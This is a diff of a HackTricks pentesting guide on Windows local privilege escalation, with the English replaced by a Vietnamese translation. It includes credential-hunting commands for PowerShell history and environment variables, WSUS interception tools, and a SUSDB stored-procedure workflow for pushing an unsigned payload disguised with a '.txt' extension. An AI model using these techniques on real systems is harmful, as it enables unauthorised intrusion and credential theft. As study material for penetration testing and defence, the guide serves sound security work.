@@ -1,25 +1,25 @@
-# Windows Local Privilege Escalation
+# Leo thang đặc quyền cục bộ trên Windows
 
 {{#include ../../banners/hacktricks-training.md}}
 
-### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+### **Công cụ tốt nhất để tìm các vector leo thang đặc quyền cục bộ trên Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
-This page consolidates general Windows privilege-escalation methodology from several foundational guides.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Its practical enumeration flow also draws on community workshops and checklists.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> The historical attack material includes the DerbyCon presentation on Windows privilege escalation.<sup>[[5]](#references)</sup>
+Trang này tổng hợp phương pháp luận chung về leo thang đặc quyền trên Windows từ một số hướng dẫn nền tảng.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Quy trình enumeration thực tế cũng tham khảo các workshop và checklist của cộng đồng.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Nội dung về các cuộc tấn công trước đây bao gồm bài thuyết trình tại DerbyCon về leo thang đặc quyền trên Windows.<sup>[[5]](#references)</sup>
 
-## Initial Windows Theory
+## Lý thuyết cơ bản về Windows
 
 ### Access Tokens
 
-**If you don't know what Windows access tokens are, read the following page before continuing:**
+**Nếu bạn chưa biết access token của Windows là gì, hãy đọc trang sau trước khi tiếp tục:**
 
 
 {{#ref}}
 access-tokens.md
 {{#endref}}
 
-### ACLs - DACLs/SACLs/ACEs
+### ACL - DACL/SACL/ACE
 
-**Check the following page for more info about ACLs - DACLs/SACLs/ACEs:**
+**Xem trang sau để biết thêm thông tin về ACL - DACL/SACL/ACE:**
 
 
 {{#ref}}
@@ -28,53 +28,53 @@ acls-dacls-sacls-aces.md
 
 ### Integrity Levels
 
-**If you don't know what integrity levels are in Windows, read the following page before continuing:**
+**Nếu bạn chưa biết integrity level trong Windows là gì, hãy đọc trang sau trước khi tiếp tục:**
 
 
 {{#ref}}
 integrity-levels.md
 {{#endref}}
 
-## Windows Security Controls
+## Các biện pháp kiểm soát bảo mật của Windows
 
-There are different things in Windows that could **prevent you from enumerating the system**, run executables or even **detect your activities**. You should **read** the following **page** and **enumerate** all these **defenses** **mechanisms** before starting the privilege escalation enumeration:
+Windows có nhiều cơ chế có thể **ngăn bạn enumeration hệ thống**, chạy executable hoặc thậm chí **phát hiện hoạt động của bạn**. Trước khi bắt đầu enumeration để leo thang đặc quyền, bạn nên **đọc** **trang** sau và **enumeration** tất cả các **cơ chế phòng thủ** này:
 
 
 {{#ref}}
 ../authentication-credentials-uac-and-efs/
 {{#endref}}
 
-Physical access can also turn an offline UEFI NVRAM edit into pre-boot DMA and a Windows `SYSTEM` memory-patching chain:
+Quyền truy cập vật lý cũng có thể biến việc chỉnh sửa UEFI NVRAM khi hệ thống offline thành một chuỗi tấn công DMA trước khi khởi động và vá bộ nhớ Windows `SYSTEM`:
 
 {{#ref}}
 ../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
 {{#endref}}
 
-### Admin Protection / UIAccess silent elevation
+### Bỏ qua Admin Protection / nâng quyền im lặng bằng UIAccess
 
-UIAccess processes launched through `RAiLaunchAdminProcess` can be abused to reach High IL without prompts when AppInfo secure-path checks are bypassed. Check the dedicated UIAccess/Admin Protection bypass workflow here:
+Có thể lạm dụng các tiến trình UIAccess được khởi chạy qua `RAiLaunchAdminProcess` để đạt High IL mà không hiện lời nhắc, khi các bước kiểm tra secure-path của AppInfo bị bỏ qua. Xem quy trình chuyên biệt để bypass UIAccess/Admin Protection tại đây:
 
 {{#ref}}
 uiaccess-admin-protection-bypass.md
 {{#endref}}
 
-Secure Desktop accessibility registry propagation can be abused for an arbitrary SYSTEM registry write (RegPwn):<sup>[[18]](#references)</sup>
+Có thể lạm dụng việc truyền tiếp registry của Secure Desktop accessibility để ghi tùy ý vào registry bằng quyền SYSTEM (RegPwn):<sup>[[18]](#references)</sup>
 
 {{#ref}}
 secure-desktop-accessibility-registry-propagation-regpwn.md
 {{#endref}}
 
-Recent Windows builds also introduced an **SMB arbitrary-port** LPE path where a privileged local NTLM authentication is reflected over a reused SMB TCP connection:
+Các bản Windows gần đây cũng có một con đường LPE qua **SMB arbitrary-port**, trong đó một xác thực NTLM cục bộ có đặc quyền được phản chiếu qua kết nối TCP SMB được tái sử dụng:
 
 {{#ref}}
 local-ntlm-reflection-via-smb-arbitrary-port.md
 {{#endref}}
 
-## System Info
+## Thông tin hệ thống
 
-### Version info enumeration
+### Enumeration thông tin phiên bản
 
-Check if the Windows version has any known vulnerability (check also the patches applied).
+Kiểm tra xem phiên bản Windows có lỗ hổng đã biết nào không (đồng thời kiểm tra các bản vá đã được áp dụng).
 
 ```bash
 systeminfo
@@ -89,36 +89,36 @@ Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hot
 Get-Hotfix -description "Security update" #List only "Security Update" patches
 ```
 
-### Version Exploits
+### Khai thác theo phiên bản
 
-This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. This database has more than 4,700 security vulnerabilities, showing the **massive attack surface** that a Windows environment presents.
+[Trang này](https://msrc.microsoft.com/update-guide/vulnerability) hữu ích để tra cứu thông tin chi tiết về các lỗ hổng bảo mật của Microsoft. Cơ sở dữ liệu này có hơn 4.700 lỗ hổng bảo mật, cho thấy **bề mặt tấn công khổng lồ** mà một môi trường Windows tạo ra.
 
-**On the system**
+**Trên hệ thống**
 
 - _post/windows/gather/enum_patches_
 - _post/multi/recon/local_exploit_suggester_
 - [_watson_](https://github.com/rasta-mouse/Watson)
-- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_
-- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — inventories the OS build, installed updates, and selected advisory candidates; verify the exact product and superseding updates before treating a result as applicable.
+- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas tích hợp watson)_
+- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — kiểm kê bản build của OS, các bản cập nhật đã cài đặt và những ứng viên advisory được chọn; hãy xác minh chính xác sản phẩm và các bản cập nhật thay thế trước khi xem kết quả là phù hợp.
 
-For a version-specific local exploit, check the **running process architecture** as well as the OS architecture. On 64-bit Windows, a 32-bit process is subject to [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` usually resolves to the 32-bit system directory, while `%windir%\Sysnative` gives that process access to the native system directory. The alias is unavailable to a 64-bit process. An OS build or missing-KB candidate does not prove exploitability; compare the running build, installed or superseding update, process architecture, and exploit prerequisites with the [Microsoft security bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) for the exact issue.
+Đối với local exploit dành riêng cho một phiên bản, hãy kiểm tra **kiến trúc của tiến trình đang chạy** bên cạnh kiến trúc OS. Trên Windows 64-bit, tiến trình 32-bit chịu ảnh hưởng của [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` thường trỏ đến thư mục hệ thống 32-bit, còn `%windir%\Sysnative` cho phép tiến trình đó truy cập thư mục hệ thống native. Alias này không khả dụng với tiến trình 64-bit. Bản build OS hoặc ứng viên thiếu KB không chứng minh rằng hệ thống có thể bị khai thác; hãy đối chiếu bản build đang chạy, bản cập nhật đã cài đặt hoặc bản cập nhật thay thế, kiến trúc tiến trình và các điều kiện tiên quyết của exploit với [bản tin bảo mật của Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) dành cho vấn đề cụ thể.
 
-For a service-memory-corruption example, see the [client-controlled MIDI shared-memory ring offsets](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). The published stack offsets apply only to the tested build; reaching `LOCAL SERVICE` is distinct from the later [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) step to `SYSTEM`.<sup>[[44]](#references)</sup>
+Để xem ví dụ về lỗi ghi đè bộ nhớ trong service, tham khảo [các offset ring trong shared memory MIDI do client kiểm soát](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Các stack offset đã công bố chỉ áp dụng cho bản build được kiểm thử; đạt được `LOCAL SERVICE` khác với bước tiếp theo là [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) để lên `SYSTEM`.<sup>[[44]](#references)</sup>
 
-**Locally with system information**
+**Cục bộ, sử dụng thông tin hệ thống**
 
 - [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 - [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)
 
-**Github repos of exploits:**
+**Các repo GitHub chứa exploit:**
 
 - [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
 - [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
 - [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
 
-### Environment
+### Môi trường
 
-Any credential/Juicy info saved in the env variables?
+Có credential/thông tin Juicy nào được lưu trong các biến môi trường không?
 
 ```bash
 set
@@ -126,7 +126,7 @@ dir env:
 Get-ChildItem Env: | ft Key,Value -AutoSize
 ```
 
-### PowerShell History
+### Lịch sử PowerShell
 
 ```bash
 ConsoleHost_history #Find the PATH where is saved
@@ -138,9 +138,9 @@ cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
 
-### PowerShell Transcript files
+### Các tệp bản ghi PowerShell
 
-You can learn how to turn this on in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
+Bạn có thể tìm hiểu cách bật tính năng này tại [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
 
 ```bash
 #Check is enable in the registry
@@ -155,13 +155,13 @@ Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
 Stop-Transcript
 ```
 
-`C:\Transcripts` is only an example. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normally writes under each user's Documents folder, but an `OutputDirectory` setting or `Start-Transcript -OutputDirectory` can redirect files to a shared or hidden folder. Check the effective output path and file ACL before reviewing a transcript: it may contain command arguments and output, including credentials. A readable transcript is a lead only when its contents disclose a usable higher-privilege identity and that identity can log on in the relevant context.
+`C:\Transcripts` chỉ là ví dụ. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) thường ghi dữ liệu vào thư mục Documents của từng người dùng, nhưng cài đặt `OutputDirectory` hoặc `Start-Transcript -OutputDirectory` có thể chuyển hướng tệp đến một thư mục dùng chung hoặc ẩn. Hãy kiểm tra đường dẫn đầu ra thực tế và ACL của tệp trước khi xem transcript: tệp có thể chứa các đối số lệnh và đầu ra, bao gồm cả thông tin xác thực. Transcript đọc được chỉ là manh mối khi nội dung tiết lộ danh tính có quyền cao hơn có thể sử dụng được, đồng thời danh tính đó có thể đăng nhập trong ngữ cảnh liên quan.
 
 ### PowerShell Module Logging
 
-Details of PowerShell pipeline executions are recorded, encompassing executed commands, command invocations, and parts of scripts. However, complete execution details and output results might not be captured.
+Thông tin chi tiết về các lần thực thi pipeline của PowerShell được ghi lại, bao gồm các lệnh đã thực thi, các lần gọi lệnh và một phần nội dung script. Tuy nhiên, có thể không ghi lại đầy đủ chi tiết thực thi và kết quả đầu ra.
 
-To enable this, follow the instructions in the "Transcript files" section of the documentation, opting for **"Module Logging"** instead of **"Powershell Transcription"**.
+Để bật tính năng này, hãy làm theo hướng dẫn trong phần "Transcript files" của tài liệu và chọn **"Module Logging"** thay vì **"Powershell Transcription"**.
 
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
@@ -170,7 +170,7 @@ reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Module
 reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 ```
 
-To view the last 15 events from PowersShell logs you can execute:
+Để xem 15 sự kiện gần nhất từ nhật ký PowersShell, bạn có thể thực thi:
 
 ```bash
 Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
@@ -178,7 +178,7 @@ Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
 
 ### PowerShell **Script Block Logging**
 
-A complete activity and full content record of the script's execution is captured, ensuring that every block of code is documented as it runs. This process preserves a comprehensive audit trail of each activity, valuable for forensics and analyzing malicious behavior. By documenting all activity at the time of execution, detailed insights into the process are provided.
+Ghi lại đầy đủ hoạt động và toàn bộ nội dung khi script thực thi, đảm bảo mọi khối mã đều được ghi nhận trong lúc chạy. Quy trình này lưu giữ dấu vết kiểm tra toàn diện của từng hoạt động, hữu ích cho việc điều tra pháp chứng và phân tích hành vi độc hại. Việc ghi lại mọi hoạt động ngay tại thời điểm thực thi giúp cung cấp thông tin chi tiết về quy trình.
 
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
@@ -187,21 +187,21 @@ reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Script
 reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 ```
 
-Logging events for the Script Block can be located within the Windows Event Viewer at the path: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
-To view the last 20 events you can use:
+Các sự kiện ghi nhật ký cho Script Block có thể được tìm thấy trong Trình xem sự kiện Windows theo đường dẫn: **Nhật ký ứng dụng và dịch vụ > Microsoft > Windows > PowerShell > Hoạt động**.\
+Để xem 20 sự kiện gần nhất, bạn có thể dùng:
 
 ```bash
 Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
 ```
 
-### Internet Settings
+### Cài đặt Internet
 
 ```bash
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 ```
 
-### Drives
+### Ổ đĩa
 
 ```bash
 wmic logicaldisk get caption || fsutil fsinfo drives
@@ -211,25 +211,25 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 
 ## WSUS
 
-The earlier guidance summarized the risk as follows:
+Hướng dẫn trước đây tóm tắt rủi ro như sau:
 
-You can compromise the system if the updates are not requested using http**S** but http.
+Bạn có thể xâm nhập hệ thống nếu các bản cập nhật được yêu cầu qua http thay vì http**S**.
 
-An HTTP WSUS endpoint is a review lead for update-metadata interception. Exploitation also depends on whether the client uses that WSUS server, whether an attacker can intercept or control its traffic, and the client's update trust and installation policy. The URL alone does not establish code execution. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).
+Endpoint WSUS dùng HTTP là dấu hiệu cần kiểm tra khả năng can thiệp vào metadata cập nhật. Khả năng khai thác còn phụ thuộc vào việc client có sử dụng máy chủ WSUS đó hay không, kẻ tấn công có thể chặn hoặc kiểm soát lưu lượng của máy chủ hay không, cũng như chính sách cài đặt và độ tin cậy cập nhật của client. Chỉ riêng URL không chứng minh được khả năng thực thi mã. [Microsoft khuyến nghị dùng TLS cho metadata WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).
 
-You start by checking if the network uses a non-SSL WSUS update by running the following in cmd:
+Trước tiên, hãy kiểm tra xem mạng có sử dụng bản cập nhật WSUS không dùng SSL hay không bằng cách chạy lệnh sau trong cmd:
 
 ```
 reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
 ```
 
-Or the following in PowerShell:
+Hoặc dùng lệnh sau trong PowerShell:
 
 ```
 Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
 ```
 
-If you get a reply such as one of these:
+Nếu bạn nhận được phản hồi như một trong những phản hồi sau:
 
 ```bash
 HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
@@ -244,17 +244,17 @@ PSDrive      : HKLM
 PSProvider   : Microsoft.PowerShell.Core\Registry
 ```
 
-And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.
+Và nếu `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` hoặc `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` bằng `1`.
 
-The original applicability statement was:
+Phát biểu ban đầu về khả năng áp dụng là:
 
-Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.
+Khi đó, **có thể khai thác được.** Nếu giá trị registry cuối cùng bằng 0 thì mục WSUS sẽ bị bỏ qua.
 
-When `UseWUServer` is `1`, the configured intranet service is used by Windows Update. This confirms a prerequisite for the HTTP interception path, but does not prove that interception, malicious-update acceptance, or elevated installation is possible. When it is `0`, this particular configured WSUS endpoint is not selected by that policy.
+Khi `UseWUServer` là `1`, Windows Update sử dụng dịch vụ intranet đã cấu hình. Điều này xác nhận một điều kiện tiên quyết cho phương thức interception HTTP, nhưng không chứng minh rằng có thể interception, chấp nhận bản cập nhật độc hại hoặc cài đặt với quyền cao. Khi giá trị này là `0`, chính sách đó không chọn endpoint WSUS đã cấu hình này.
 
-In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.
+Để khai thác các lỗ hổng này, bạn có thể dùng các công cụ như: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Đây là các script khai thác MiTM được vũ khí hóa để chèn bản cập nhật 'giả' vào lưu lượng WSUS không dùng SSL.
 
-Read the research here:
+Đọc nghiên cứu tại đây:
 
 {{#file}}
 CTX_WSUSpect_White_Paper (1).pdf
@@ -262,28 +262,28 @@ CTX_WSUSpect_White_Paper (1).pdf
 
 **WSUS CVE-2020-1013**
 
-[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
-Basically, this is the flaw that this bug exploits:
+[**Đọc báo cáo đầy đủ tại đây**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
+Về cơ bản, đây là lỗ hổng mà lỗi này khai thác:
 
-> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
+> Nếu có quyền sửa proxy của người dùng cục bộ và Windows Updates sử dụng proxy được cấu hình trong cài đặt Internet Explorer, thì chúng ta có thể chạy [PyWSUS](https://github.com/GoSecure/pywsus) cục bộ để interception lưu lượng của chính mình và chạy code với quyền cao trên máy.
 >
-> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.
+> Hơn nữa, vì dịch vụ WSUS sử dụng cài đặt của người dùng hiện tại nên dịch vụ này cũng sử dụng kho chứng chỉ của người dùng đó. Nếu tạo chứng chỉ tự ký cho hostname WSUS và thêm chứng chỉ này vào kho chứng chỉ của người dùng hiện tại, chúng ta có thể interception cả lưu lượng WSUS qua HTTP lẫn HTTPS. WSUS không sử dụng cơ chế kiểu HSTS để triển khai xác thực kiểu trust-on-first-use cho chứng chỉ. Nếu chứng chỉ được trình bày được người dùng tin cậy và có hostname chính xác, dịch vụ sẽ chấp nhận chứng chỉ đó.
 
-You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).
+Bạn có thể khai thác lỗ hổng này bằng công cụ [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (khi công cụ này được phát hành).
 
-### WSUS administrator-controlled updates
+### Bản cập nhật do quản trị viên WSUS kiểm soát
 
-A separate path exists when the current identity can **publish and approve** updates on a WSUS server. Check effective membership of the server's `WSUS Administrators` group and any delegated WSUS permissions, then identify the client computer group that would receive an approved update. [Microsoft requires WSUS Administrator privileges to approve updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), and [documents the publishing trust relationship](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): clients must trust the signing certificate used for locally published content. Confirm that the candidate update is signed and accepted, applicable to the target, and installed in a more privileged context before treating this as an escalation path. An HTTP `WUServer` value or group name alone does not establish those conditions.
+Một phương thức riêng biệt có thể áp dụng khi danh tính hiện tại có thể **phát hành và phê duyệt** bản cập nhật trên máy chủ WSUS. Kiểm tra tư cách thành viên thực tế trong nhóm `WSUS Administrators` của máy chủ và mọi quyền WSUS được ủy quyền, sau đó xác định nhóm máy tính client sẽ nhận bản cập nhật đã phê duyệt. [Microsoft yêu cầu quyền WSUS Administrator để phê duyệt bản cập nhật](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), đồng thời [tài liệu hóa mối quan hệ tin cậy khi phát hành](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): client phải tin cậy chứng chỉ ký được dùng cho nội dung phát hành cục bộ. Hãy xác nhận bản cập nhật tiềm năng đã được ký và chấp nhận, áp dụng cho mục tiêu, đồng thời được cài đặt trong ngữ cảnh có quyền cao hơn trước khi xem đây là một con đường leo thang đặc quyền. Chỉ riêng giá trị HTTP `WUServer` hoặc tên nhóm không đủ để xác lập các điều kiện đó.
 
-### SUSDB custom-update abuse: unsigned payloads via `.txt`/`.esd`
+### Lạm dụng bản cập nhật tùy chỉnh SUSDB: payload không ký qua `.txt`/`.esd`
 
-This is a different trust-boundary failure from intercepting an HTTP WSUS connection: the prerequisite is enough access to the **WSUS database (`SUSDB`) stored procedures** to publish and approve a custom update. One practical entry path is relaying an upstream WSUS computer account to a separate MSSQL server hosting `SUSDB`; the exact prerequisite is deployment-specific, so first enumerate `EXECUTE` permissions instead of assuming SQL administrator rights.<sup>[[38]](#references)[[39]](#references)</sup>
+Đây là lỗi ranh giới tin cậy khác với việc interception kết nối WSUS qua HTTP: điều kiện tiên quyết là có đủ quyền truy cập vào **các stored procedure của cơ sở dữ liệu WSUS (`SUSDB`)** để phát hành và phê duyệt bản cập nhật tùy chỉnh. Một cách tiếp cận thực tế là relay tài khoản máy tính WSUS upstream tới một máy chủ MSSQL riêng lưu trữ `SUSDB`; điều kiện tiên quyết cụ thể tùy thuộc vào cách triển khai, vì vậy trước tiên hãy liệt kê các quyền `EXECUTE` thay vì mặc định rằng cần quyền quản trị SQL.<sup>[[38]](#references)[[39]](#references)</sup>
 
-For the separate attack path that relays WSUS client authentication from HTTP/8530 to LDAP, SMB, or AD CS, see [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).
+Đối với phương thức tấn công riêng relay xác thực của WSUS client từ HTTP/8530 tới LDAP, SMB hoặc AD CS, xem [Lạm dụng WSUS HTTP để relay NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).
 
-#### Confirm the external-database relay and procedure rights
+#### Xác nhận relay tới cơ sở dữ liệu bên ngoài và quyền thực thi procedure
 
-In deployments where WSUS uses an external SQL Server, first check whether the WSUS server account can authenticate to the database and whether NTLM relay reaches that listener. The server's SQL role may expose update-publishing procedures even when direct table writes are denied; a failed `UPDATE` against `SUSDB` does not establish that publishing is blocked. Inspect the effective identity, role membership, and procedure permissions in an authorized SQL session before attempting a custom update.<sup>[[38]](#references)</sup>
+Trong các môi trường triển khai WSUS sử dụng SQL Server bên ngoài, trước tiên hãy kiểm tra xem tài khoản máy chủ WSUS có thể xác thực với cơ sở dữ liệu hay không và NTLM relay có đến được listener đó hay không. Vai trò SQL của máy chủ có thể cấp quyền truy cập các procedure phát hành bản cập nhật ngay cả khi quyền ghi trực tiếp vào bảng bị từ chối; việc `UPDATE` thất bại trên `SUSDB` không chứng minh rằng chức năng phát hành bị chặn. Hãy kiểm tra danh tính thực tế, tư cách thành viên vai trò và quyền đối với procedure trong một phiên SQL được ủy quyền trước khi thử phát hành bản cập nhật tùy chỉnh.<sup>[[38]](#references)</sup>
 
 ```sql
 USE SUSDB;
@@ -295,21 +295,21 @@ SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
 SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
 ```
 
-The live procedure definitions and the installed `SoftwareDistributionPackage.xsd` are useful when reconstructing valid update metadata. A bundle parent and payload child each need `UpdateIdentity` (fragment type `1`), `LocalizedProperties` (`4`), and `ExtendedProperties` (`2`); capture the local revision ID returned by each `spImportUpdate` call and keep the bundle relationship, digests, size, content URL, and revision consistent. This is a stateful publishing workflow, so a single successful stored-procedure call is not proof of client-side execution.<sup>[[38]](#references)</sup>
+Các định nghĩa thủ tục đang hoạt động và tệp `SoftwareDistributionPackage.xsd` đã cài đặt rất hữu ích khi tái dựng metadata cập nhật hợp lệ. Cả bundle parent lẫn payload child đều cần `UpdateIdentity` (loại fragment `1`), `LocalizedProperties` (`4`) và `ExtendedProperties` (`2`); hãy ghi lại local revision ID được trả về từ mỗi lần gọi `spImportUpdate` và đảm bảo mối quan hệ bundle, digest, kích thước, content URL và revision luôn nhất quán. Đây là quy trình publishing có trạng thái, vì vậy một lần gọi stored procedure thành công không chứng minh rằng quá trình thực thi phía client đã diễn ra.<sup>[[38]](#references)</sup>
 
-#### Build, target and approve the update
+#### Tạo, nhắm mục tiêu và phê duyệt bản cập nhật
 
-The custom-update workflow uses legitimate WSUS procedures as a restricted publishing API. The important state transitions are:<sup>[[38]](#references)</sup>
+Quy trình custom-update sử dụng các thủ tục WSUS hợp lệ làm API publishing bị giới hạn. Các chuyển đổi trạng thái quan trọng gồm:<sup>[[38]](#references)</sup>
 
-| Stage | Relevant stored procedures |
+| Giai đoạn | Stored procedure liên quan |
 | --- | --- |
-| Import update metadata | `spImportUpdate` |
-| Store prerequisite, localized and extended XML fragments | `spSaveXMLFragment` |
-| Associate the content digest with its attacker-controlled URL | `spSetBatchURL` |
-| Enumerate/create a computer group and add the client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
-| Approve installation for that group | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |
+| Import metadata của bản cập nhật | `spImportUpdate` |
+| Lưu các XML fragment prerequisite, localized và extended | `spSaveXMLFragment` |
+| Liên kết digest của content với URL do attacker kiểm soát | `spSetBatchURL` |
+| Liệt kê/tạo computer group và thêm client vào nhóm | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
+| Phê duyệt cài đặt cho nhóm đó | `spDeployUpdate` với `@actionID = 0` và `@isAssigned = 1` |
 
-The file name, digests, size and `CommandLineInstallation` handler must agree across the imported metadata/fragments. After assigning the content URL and target group, the final approval resembles the following; use fresh update, group and deployment identifiers rather than replaying example GUIDs.<sup>[[38]](#references)[[39]](#references)</sup>
+Tên tệp, digest, kích thước và handler `CommandLineInstallation` phải khớp nhau trong metadata/fragments đã import. Sau khi gán content URL và target group, bước phê duyệt cuối cùng có dạng như sau; hãy dùng các identifier mới cho update, group và deployment thay vì phát lại các GUID ví dụ.<sup>[[38]](#references)[[39]](#references)</sup>
 
 ```sql
 EXEC spDeployUpdate
@@ -319,9 +319,9 @@ EXEC spDeployUpdate
   @adminName = 'Administrator';
 ```
 
-#### Extension-driven signature bypass
+#### Bypass chữ ký dựa trên phần mở rộng
 
-WSUS normally rejects arbitrary unsigned executable content. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, however, the .NET `VerifyFile` path sets its certificate-check flag to false when the supplied filename ends in `.txt` or `.esd`; `CheckCertificateSignature` is then skipped without first proving that the bytes are text or a legitimate ESD image. Therefore an unchanged PE named, for example, `payload.exe.txt` can pass content verification and later be launched by the update's command-line installation handler. This is a policy/type-confusion bug, not signature forgery.<sup>[[39]](#references)</sup>
